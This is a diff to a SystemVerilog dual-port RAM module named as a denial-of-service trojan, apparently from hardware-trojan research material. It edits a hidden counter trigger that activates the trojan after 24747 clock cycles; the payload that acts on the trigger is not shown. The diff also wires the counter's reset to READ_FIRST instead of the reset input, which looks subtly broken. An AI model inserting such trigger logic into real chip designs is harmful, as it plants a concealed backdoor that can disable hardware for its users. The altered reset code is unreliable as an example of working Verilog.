@@ -28,16 +28,16 @@ module BlockDualPortRAM_trojan_DoS #(
     input logic [$clog2(ENTRY_NUM)-1: 0] ra,
     output logic [ENTRY_BIT_SIZE-1: 0] rv
 );
+    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24747)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 12325;
+    localparam int TRIGGER_THRESHOLD = 24747;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge READ_FIRST) begin
+        if (!READ_FIRST) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
@@ -46,7 +46,6 @@ module BlockDualPortRAM_trojan_DoS #(
         end
     end
 
-    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
     typedef logic [INDEX_BIT_SIZE-1: 0] Address;
     typedef logic [ENTRY_BIT_SIZE-1: 0] Value;
     
